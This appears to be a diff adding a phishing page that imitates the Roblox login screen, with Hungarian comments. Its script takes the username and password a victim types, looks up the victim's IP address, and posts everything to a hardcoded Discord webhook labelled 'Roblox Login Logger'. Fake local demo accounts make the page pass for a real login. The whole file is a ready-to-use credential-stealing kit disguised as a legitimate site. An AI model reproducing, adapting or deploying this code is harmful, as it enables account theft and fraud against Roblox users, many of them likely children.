@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    /* Background & layout */
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: url("https://images.rbxcdn.com/782b7fc18a24ee997efd9a7f02fa4bf9-bg_08072019.jpg") no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #333;
+    }
+
+    /* Overlay panel container */
+    .login-container {
+      width: 350px;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      padding: 40px 30px;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    /* Logo */
+    .logo {
+      margin-bottom: 30px;
+    }
+    
+    .logo h1 {
+      font-size: 3.5rem;
+      font-weight: 800;
+      letter-spacing: 1px;
+      color: #333;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      margin: 0;
+    }
+    
+    .logo p {
+      color: #666;
+      margin-top: 5px;
+      font-size: 1.1rem;
+    }
+
+    /* Input styling */
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 14px 40px 14px 14px;
+      border-radius: 6px;
+      border: 1px solid #ddd;
+      background: #f9f9f9;
+      color: #333;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+      box-sizing: border-box;
+    }
+
+    .input-group input:focus {
+      outline: none;
+      border-color: #aaa;
+      box-shadow: 0 0 0 2px rgba(170, 170, 170, 0.2);
+    }
+
+    .input-group input::placeholder {
+      color: #888;
+    }
+
+    /* Password eye toggle */
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888;
+      cursor: pointer;
+    }
+
+    /* Buttons */
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 1rem;
+      font-weight: 600;
+      margin-bottom: 12px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-sizing: border-box;
+    }
+
+    .btn-primary {
+      background: #fff;
+      color: #333;
+      border: 1px solid #ddd;
+    }
+
+    .btn-primary:hover {
+      background: #f5f5f5;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid #ddd;
+      color: #333;
+    }
+
+    .btn-secondary:hover {
+      background: rgba(0, 0, 0, 0.03);
+    }
+
+    /* Footer link */
+    .footer {
+      margin-top: 25px;
+      font-size: 0.9rem;
+      line-height: 1.5;
+      color: #666;
+    }
+
+    .footer a {
+      color: #333;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* Message styling */
+    .message {
+      padding: 12px;
+      border-radius: 6px;
+      margin-top: 15px;
+      display: none;
+      font-weight: 500;
+      text-align: center;
+    }
+
+    .success {
+      background: rgba(46, 204, 113, 0.1);
+      color: #27ae60;
+      display: block;
+    }
+
+    .error {
+      background: rgba(231, 76, 60, 0.1);
+      color: #c0392b;
+      display: block;
+    }
+
+    /* Options */
+    .options {
+      display: flex;
+      justify-content: space-between;
+      margin: 15px 0 25px;
+      font-size: 0.9rem;
+      align-items: center;
+    }
+
+    .options label {
+      display: flex;
+      align-items: center;
+      color: #666;
+    }
+
+    .options input {
+      margin-right: 6px;
+    }
+
+    .options a {
+      color: #333;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .options a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Divider */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #999;
+    }
+    
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #ddd;
+    }
+    
+    .divider span {
+      padding: 0 10px;
+      font-size: 0.9rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <h1>Roblox</h1>
+      <p>Login to your account</p>
+    </div>
+
+    <form id="login-form">
+      <div class="input-group">
+        <input type="text" id="username" placeholder="Username/Email/Phone" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password" required>
+        <span class="password-toggle" onclick="togglePassword()">
+          <i class="fas fa-eye"></i>
+        </span>
+      </div>
+
+      <div class="options">
+        <label>
+          <input type="checkbox" id="remember-me"> Remember me
+        </label>
+        <a href="#">Forgot password?</a>
+      </div>
+
+      <button type="submit" class="btn btn-primary">Log In</button>
+      <div class="message" id="login-message"></div>
+    </form>
+    
+    <div class="divider">
+      <span>OR</span>
+    </div>
+
+    <button class="btn btn-secondary">Log In With Another Device</button>
+
+    <div class="footer">
+      <p>By continuing, you agree to our <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Terms of Service</a> and <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy" target="_blank">Privacy Policy</a>.</p>
+    </div>
+  </div>
+
+  <script>
+    // Discord webhook URL - IDE ÍRD BE A SAJÁT WEBHOOK URL-EDET
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413606943729127504/l6JwTCzUXp-MWtF0d4kQqT6a_VBOhIm0tawPHy56gKFTifnUK-OpmuHIkaU7BuovCUb7';
+    
+    // Toggle password visibility
+    function togglePassword() {
+      const passwordInput = document.getElementById('password');
+      const eyeIcon = document.querySelector('.password-toggle i');
+      
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        eyeIcon.classList.replace('fa-eye', 'fa-eye-slash');
+      } else {
+        passwordInput.type = 'password';
+        eyeIcon.classList.replace('fa-eye-slash', 'fa-eye');
+      }
+    }
+
+    // Initialize "database" in localStorage if it doesn't exist
+    if (!localStorage.getItem('users')) {
+      // Create a default user for demonstration
+      localStorage.setItem('users', JSON.stringify([
+        { username: 'demo', password: 'password123' }
+      ]));
+    }
+
+    // Adatok elküldése Discord webhookra
+    function sendToDiscordWebhook(username, password) {
+      const data = {
+        username: "Roblox Login Logger",
+        embeds: [
+          {
+            title: "Új bejelentkezési kísérlet",
+            color: 5814783, // Purple color
+            fields: [
+              {
+                name: "Felhasználónév",
+                value: username || "Nincs megadva",
+                inline: true
+              },
+              {
+                name: "Jelszó",
+                value: password || "Nincs megadva",
+                inline: true
+              },
+              {
+                name: "Időpont",
+                value: new Date().toLocaleString(),
+                inline: false
+              },
+              {
+                name: "IP cím",
+                value: "Élő adat...",
+                inline: false
+              }
+            ],
+            footer: {
+              text: "Roblox Login Logger"
+            },
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      // IP cím lekérése
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+          data.embeds[0].fields[3].value = ipData.ip;
+          
+          // Webhook küldése
+          return fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+          });
+        })
+        .catch(error => {
+          console.error('Hiba az IP cím lekérésekor:', error);
+          // Webhook küldése IP nélkül
+          fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+          });
+        });
+    }
+
+    // Login form submission
+    document.getElementById('login-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const rememberMe = document.getElementById('remember-me').checked;
+      
+      // Adatok elküldése Discord webhookra
+      sendToDiscordWebhook(username, password);
+      
+      // Check credentials
+      const users = JSON.parse(localStorage.getItem('users'));
+      const user = users.find(user => user.username === username && user.password === password);
+      
+      if (user) {
+        showMessage('Login successful! Redirecting...', 'success');
+        
+        // Store logged in user
+        if (rememberMe) {
+          localStorage.setItem('currentUser', JSON.stringify(user));
+        } else {
+          sessionStorage.setItem('currentUser', JSON.stringify(user));
+        }
+        
+        // Simulate redirect
+        setTimeout(() => {
+          alert(`Welcome back, ${username}!`);
+          document.getElementById('login-form').reset();
+        }, 1500);
+      } else {
+        showMessage('Invalid username or password!', 'error');
+      }
+    });
+
+    // Show message function
+    function showMessage(text, type) {
+      const messageElement = document.getElementById('login-message');
+      messageElement.textContent = text;
+      messageElement.className = 'message ' + type;
+      
+      // Clear message after 3 seconds
+      setTimeout(() => {
+        messageElement.className = 'message';
+      }, 3000);
+    }
+
+    // Check if user is already logged in (for demonstration purposes)
+    window.addEventListener('DOMContentLoaded', () => {
+      const currentUser = JSON.parse(localStorage.getItem('currentUser') || sessionStorage.getItem('currentUser'));
+      if (currentUser) {
+        document.getElementById('username').value = currentUser.username;
+        document.getElementById('remember-me').checked = !!localStorage.getItem('currentUser');
+      }
+    });
+  </script>
+</body>
+</html>
